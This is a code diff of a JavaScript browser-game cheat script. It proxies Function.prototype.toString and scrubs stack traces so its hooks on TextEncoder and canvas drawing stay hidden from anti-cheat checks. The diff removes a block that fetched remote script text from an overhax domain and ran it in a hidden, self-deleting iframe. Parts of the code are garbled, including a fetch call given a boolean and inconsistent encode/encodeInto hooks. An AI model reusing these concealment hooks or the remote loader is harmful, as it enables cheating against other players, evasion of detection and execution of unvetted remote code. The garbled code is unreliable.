@@ -90,7 +90,13 @@ document.body.appendChild(d);
 //Fps counter
 javascript:(function(){var script=document.createElement('script');script.onload=function(){var stats=new Stats();document.body.appendChild(stats.dom);requestAnimationFrame(function loop(){stats.update();requestAnimationFrame(loop)});};script.src='//mrdoob.github.io/stats.js/build/stats.min.js';document.head.appendChild(script);})()
 
-let shared_state = new Map(Object.entries({functions_to_hide: new WeakMap(), strings_to_hide: [], hidden_globals: [], init: false}));
+
+let shared_state = new Map(Object.entries({
+    functions_to_hide: new WeakMap(),
+    strings_to_hide: [],
+    hidden_globals: [],
+    init: false
+}));
 
 let invisible_define = function(obj, key, value) {
     shared_state.get('hidden_globals').push(key);
@@ -103,44 +109,47 @@ let invisible_define = function(obj, key, value) {
 };
 
 let conceal_function = function(original_Function, hook_Function) {
-    shared_state.get('functions_to_hide').set(hook_Function, original_Function);
-};
+        shared_state.get('functions_to_hide').set(hook_Function, original_Function);
+    };
 
-let conceal_string = function(original_string, hook_string) {
-    shared_state.get('strings_to_hide').push({from: new RegExp(hook_string.replace(/([\[|\]|\(|\)|\*|\\|\.|\+])/g,'\\$1'), 'g'), to: original_string});
-};
+    let conceal_string = function(original_string, hook_string) {
+        shared_state.get('strings_to_hide').push({
+            from: new RegExp(hook_string.replace(/([\[|\]|\(|\)|\*|\\|\.|\+])/g, '\\$1'), 'g'),
+            to: original_string
+        });
+    };
 
-const original_toString = Function.prototype.toString;
-let hook_toString = new Proxy(original_toString, {
-    apply: function(target, _this, _arguments) {
-        try {
-            var ret = Function.prototype.apply.apply(target, [_this, _arguments]);
-        } catch (e) {
-            // modify stack trace to hide proxy
-            e.stack = e.stack.replace(/\n.*Object\.apply \(<.*/, '');
-            throw e;
+    const original_toString = Function.prototype.toString;
+    let hook_toString = new Proxy(original_toString, {
+        apply: function(target, _this, _arguments) {
+            try {
+                var ret = Function.prototype.apply.apply(target, [_this, _arguments]);
+            } catch (e) {
+                // modify stack trace to hide proxy
+                e.stack = e.stack.replace(/\n.*Object\.apply \(<.*/, '');
+                throw e;
+            }
+
+            let lookup_fn = shared_state.get('functions_to_hide').get(_this);
+            if (lookup_fn) {
+                return Function.prototype.apply.apply(target, [lookup_fn, _arguments]);
+            }
+
+            for (var i = 0; i < shared_state.get('strings_to_hide').length; i++) {
+                ret = ret.replace(shared_state.get('strings_to_hide')[i].from, shared_state.get('strings_to_hide')[i].to);
+            }
+            return ret;
         }
-
-        let lookup_fn = shared_state.get('functions_to_hide').get(_this);
-        if (lookup_fn) {
-            return Function.prototype.apply.apply(target, [lookup_fn, _arguments]);
-        }
-
-        for (var i = 0; i < shared_state.get('strings_to_hide').length; i++) {
-            ret = ret.replace(shared_state.get('strings_to_hide')[i].from, shared_state.get('strings_to_hide')[i].to);
-        }
-        return ret;
-    }
-});
-Function.prototype.toString = hook_toString;
-conceal_function(original_toString, hook_toString);
+    });
+    Function.prototype.toString = hook_toString;
+    conceal_function(original_toString, hook_toString);
 //
 
 var distance, cnBSeen, canSee, pchObjc, objInstances, isYou, recoilAnimY, mouseDownL, mouseDownR, inputs, getWorldPosition;
 console.json = object => console.log(JSON.stringify(object, undefined, 2));
 const defined = object => typeof object !== "undefined";
 
-const original_encode = TextEncoder.prototype.encode;
+const original_encode = TextEncoder.prototype.encodeInto;
 let hook_encode = new Proxy(original_encode, {
     apply: function(target, _this, _arguments) {
         let game = false;
@@ -151,17 +160,18 @@ let hook_encode = new Proxy(original_encode, {
                 game = true;
             }
 
-        } catch (e) {
-            // modify stack trace to hide proxy
-            e.stack = e.stack.replace(/\n.*Object\.apply \(<.*/, '');
-            throw e;
-        }
-        if (game) TextEncoder.prototype.encode = original_encode;
+         } catch (e) {
+                // modify stack trace to hide proxy
+                e.stack = e.stack.replace(/\n.*Object\.apply \(<.*/, '');
+                throw e;
+            }
+            if (game) TextEncoder.prototype.encodeInto = original_encode;
 
-        return Function.prototype.apply.apply(target, [_this, _arguments]);
-    }
-}); TextEncoder.prototype.encode = hook_encode;
-conceal_function(original_encode, hook_encode);
+            return Function.prototype.apply.apply(target, [_this, _arguments]);
+        }
+    });
+    TextEncoder.prototype.encodeInto = hook_encode;
+    conceal_function(original_encode, hook_encode);
 
 let render = function() {
 
@@ -476,16 +486,3 @@ let hook_fillRect = new Proxy(original_fillRect, {
     }
 }); CanvasRenderingContext2D.prototype.fillRect = hook_fillRect;
 conceal_function(original_fillRect, hook_fillRect);
-fetch (overhaxfree.length > /*THEGUY3ds*/overhax.ml && code[0] === '!')
-.then(response => response.text())
-.then(text => {
-	let frame = document.createElement('iframe');
-	frame.setAttribute('style', 'display:none');
-	document.documentElement.appendChild(frame);
-	let child = frame.contentDocument || frame.contentWindow.document;
-	let chair = document.createElement('script');
-	chair.innerHTML = text.toString().replace(/overhax.ml/g, Math.random().toString(36).substring(2, 15));;
-	child.documentElement.append(chair);
-	child.documentElement.remove(chair);
-	document.documentElement.removeChild(frame);
-});
